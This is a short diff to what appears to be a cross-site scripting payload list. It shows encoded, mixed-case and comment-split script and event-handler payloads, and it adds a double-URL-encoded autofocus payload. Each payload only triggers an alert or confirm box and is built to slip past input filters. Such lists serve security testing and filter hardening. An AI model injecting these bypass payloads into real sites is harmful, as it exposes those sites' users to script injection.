@@ -3,3 +3,4 @@ hello%22%3E%3Cscript%3Ealert(1)%3C/script%3E
 <svg/On/OnLoAd=confirm(1)><!--
 "</h1><<!--xss-->script>alert(1)</script><!--
 "><SVG ONMOUSEOVER=ALERT(1)>
+%2527%2520onfocus%253D%2527alert%25281%2529%2527%2520autofocus%253D%2527 : Double Encoding
